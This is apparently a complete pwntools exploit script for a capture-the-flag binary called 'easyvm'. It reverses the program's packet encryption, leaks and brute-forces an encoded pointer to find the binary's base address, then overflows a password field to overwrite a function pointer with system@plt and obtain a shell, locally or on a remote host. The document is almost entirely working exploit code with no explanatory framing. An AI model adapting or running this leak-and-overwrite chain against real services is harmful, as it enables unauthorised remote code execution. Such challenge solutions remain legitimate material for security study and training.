from pwn import *
from ctypes import *
import sys
import struct

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./easyvm")
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    elf = ELF("./easyvm")
else:
    p = remote(sys.argv[1], sys.argv[2])
    libc = ELF("libc.so.6")
    elf = ELF("./easyvm")

def pl32(integer):
    return struct.pack(">I", integer)

def gen_rands(seed):
    clibc = cdll.LoadLibrary("/usr/lib/x86_64-linux-gnu/libc.so.6")
    clibc.srand(seed)
    rands = []
    for i in range(16):
        rands.append(clibc.rand())
    return rands

def encrypt(packet):
    packet_list = list(packet)
    length = len(packet)
    """
	v9 = index & 2;
	v2[index] ^= *((_BYTE *)&dword_6240[v8 & 0xF] + v9);
	v7 = v8 + ((v9 >> 1) ^ 1);
	v2[index + 1] ^= *((_BYTE *)&dword_6240[v7 & 0xF] + (((_BYTE)index + 1) & 3));
	index += 2LL;
	v8 = v7;
    """
    v8 = 0
    for i in range(0, length - 1, 2):
        v9 = i & 2
        packet_list[i] ^= p32(rands[(v8 & 0xf)])[v9]
        v7 = v8 + ((v9 >> 1) ^ 1)
        packet_list[i + 1] ^= p32(rands[(v7 & 0xf)])[(i + 1) & 3]
        v8 = v7
    if length % 2 != 0:
        #v2[index] ^= *((_BYTE *)&dword_6240[v7 & 0xF] + (index & 3))
        packet_list[length - 1] = p32(rands[v7 & 0xf])[(length - 1) & 3]
    output = b""
    for i in range(length):
        output += packet_list[i].to_bytes(length=1, byteorder="little")
    return output

def send_manage_packet(packet):
    p.sendafter(b"Input manager packet: \n", encrypt(packet))

def memcpy_test():
    p1 = b""
    p1 += pl32(2) #protocol
    p1 += pl32(0) #index
    p1 += p32(1111)
    send_manage_packet(p1)

def login(length, name, passwd, uid):
    p1 = b""
    p1 += pl32(1) + pl32(0) + pl32(length)
    p1 += name + b":" + passwd + b";"
    p1 += uid
    send_manage_packet(p1)

def show(uid):
    p1 = b""
    p1 += pl32(1) + pl32(1)
    p1 += uid
    send_manage_packet(p1)

def logout(uid):
    p1 = b""
    p1 += pl32(1) + pl32(2)
    p1 += uid
    send_manage_packet(p1) 

def encrypt2(key):
    init_scmgr = key
    g_table = [init_scmgr]
    for i in range(31):
        init_scmgr = (init_scmgr * 69069) & 0xffffffff
        g_table.append(init_scmgr)

    g_index = 0
    v0 = (g_index-1) & 0x1f
    v2 = g_table[(g_index + 3) & 0x1f] ^ g_table[g_index] ^ (g_table[(g_index + 3) & 0x1f] >> 8)
    v1 = g_table[v0]
    v3 = g_table[(g_index + 10) & 0x1F]
    v4 = g_table[(g_index - 8) & 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) & 0x1F])) << 14)
    v4 = v4 & 0xffffffff
    g_table[g_index] = v2 ^ v4
    g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) << 7)) & 0xffffffff
    g_index = (g_index - 1) & 0x1F
    return g_table[g_index]

def brute_force_number(target):
    for base in range(0, 0xfffff000, 0x1000):
        addr = base + 0x18a0
        if encrypt2(addr) == target:
            return addr
    return 0

def debugf(b1, b2):
    if debug:
        gdb.attach(p, "b *$rebase({b1})\nb *$rebase({b2})".format(b1=hex(b1), b2=hex(b2)))

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
debugf(0x0000000000002150, 0x0000000000001d00)
p.recvuntil(b"Begin connect: ")
rand_seed = int(p.recvuntil(b"\n", drop=True))
#print(rand_seed)
log.success("rand_seed: " + str(rand_seed))
rands = gen_rands(rand_seed)
log.success("rands: " + str(rands))
test_p = b"1234567890"
#print(encrypt(b"1234567890"))
#send_manage_packet(test_p)
login(0x10, b"a" * 8, b"b" * 0x180, b"u" * 8)
show(b"u" * 8)
p.recvuntil(b"encode_passwd: ")
p.recv(0x180)
low_puts_addr = u32(p.recv(4))
high_puts_addr = u16(p.recv(2))
# try bruteforce low_puts_addr
low_puts_brute = brute_force_number(low_puts_addr)
print(hex(low_puts_brute))
show_func_addr = low_puts_brute + (high_puts_addr << 32)
log.success("show_func_addr: " + hex(show_func_addr))
elf_base = show_func_addr - 0x18a0
log.success("elf_base: " + hex(elf_base))
elf.address = elf_base
system_plt = elf.plt["system"]

logout(b"u" * 8)
name = b"a" * 0x8
passwd = b"/bin/sh\n" + b"b" * (0x180 - 8) + p64(system_plt)[:6]
length = len(name) + len(passwd) + 1 - 0x20
login(length, name, passwd, b"u" * 8)
show(b"u" * 8)
p.interactive()
